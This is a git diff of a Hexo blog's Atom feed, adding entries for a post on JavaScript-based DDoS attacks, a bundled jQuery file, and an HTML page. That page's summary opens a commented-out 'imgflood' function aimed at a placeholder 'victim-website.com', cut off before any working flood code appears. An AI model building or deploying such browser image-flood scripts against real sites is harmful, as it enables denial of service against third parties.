@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://magic-king.net/"/>
-  <updated>2019-12-12T07:41:36.170Z</updated>
+  <updated>2019-12-03T12:08:32.822Z</updated>
   <id>http://magic-king.net/</id>
   
   <author>
@@ -17,17 +17,80 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
-    <title>DDoS-Javascript</title>
-    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/"/>
-    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/</id>
-    <published>2019-12-12T07:41:36.000Z</published>
-    <updated>2019-12-12T07:41:36.170Z</updated>
+    <title></title>
+    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/"/>
+    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/jquery-1.10.2.min/</id>
+    <published>2019-12-12T07:51:08.388Z</published>
+    <updated>2019-12-03T12:08:32.822Z</updated>
     
     <summary type="html">
+    
+      
+      
+        /*! jQuery v1.10.2 | (c) 2005, 2013 jQuery Foundation, Inc. | jquery.org/license
+//@ sourceMappingURL=jquery-1.10.2.min.map
+*/
+(function(e,t){var n,r,i=typeof t
+      
     
     </summary>
     
     
+    
+  </entry>
+  
+  <entry>
+    <title></title>
+    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/fuck/"/>
+    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/fuck/</id>
+    <published>2019-12-12T07:51:08.325Z</published>
+    <updated>2019-12-03T11:55:55.824Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        
+&lt;head&gt;&lt;meta name=&quot;generator&quot; content=&quot;Hexo 3.8.0&quot;&gt;
+&lt;!--&lt;script type=&#39;text/javascript&#39;&gt;
+function imgflood(){
+	//var TARGET = &#39;victim-website.com&#39;
+	var TARGET = 
+      
+    
+    </summary>
+    
+    
+    
+  </entry>
+  
+  <entry>
+    <title>DDoS-JavaScript</title>
+    <link href="http://magic-king.net/2019/12/12/DDoS-Javascript/"/>
+    <id>http://magic-king.net/2019/12/12/DDoS-Javascript/</id>
+    <published>2019-12-12T07:41:36.000Z</published>
+    <updated>2019-12-12T07:57:24.579Z</updated>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;h1 id=&quot;关于JavaScript的DDoS攻击&quot;&gt;&lt;a href=&quot;#关于JavaScript的DDoS攻击&quot; class=&quot;headerlink&quot; title=&quot;关于JavaScript的DDoS攻击&quot;&gt;&lt;/a&gt;关于JavaScript的DDoS攻击&lt;/h1&gt;&lt;blockquote&gt;
+&lt;p&gt;引用：&lt;/p&gt;
+&lt;
+      
+    
+    </summary>
+    
+    
+      <category term="DDoS" scheme="http://magic-king.net/categories/DDoS/"/>
+    
+    
+      <category term="Network" scheme="http://magic-king.net/tags/Network/"/>
+    
+      <category term="DDoS" scheme="http://magic-king.net/tags/DDoS/"/>
+    
+      <category term="JavaScript" scheme="http://magic-king.net/tags/JavaScript/"/>
     
   </entry>
   
